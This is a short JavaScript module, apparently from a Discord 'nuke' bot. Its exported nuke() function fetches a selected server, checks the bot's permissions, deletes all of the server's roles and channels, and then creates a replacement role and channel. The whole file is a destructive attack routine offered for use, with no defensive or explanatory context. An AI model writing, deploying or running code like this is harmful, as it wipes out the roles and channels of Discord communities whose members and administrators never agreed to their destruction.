import { client } from "../index.js";
import { selectedGuild } from "../alert/getGuild.js";
import { ChannelManager } from "./channel.js";
import { RoleManager } from "./role.js";
import checkPermissions from "./checkPermission.js";
async function getGuild() {
  return await client.guilds.fetch(selectedGuild.id);
}
async function getBot() {
  const guild = await getGuild();
  return await guild.members.fetch(client.user.id);
}
export default async function nuke() {
  const guild = await getGuild();
  const bot = await getBot();
  if (!(await checkPermissions(bot))) return;
  await RoleManager.deleteAllRoles(guild);
  await ChannelManager.deleteAllChannels(guild);
  await Promise.all([
    RoleManager.createRole(guild),
    ChannelManager.createChannel(guild),
  ]);
}
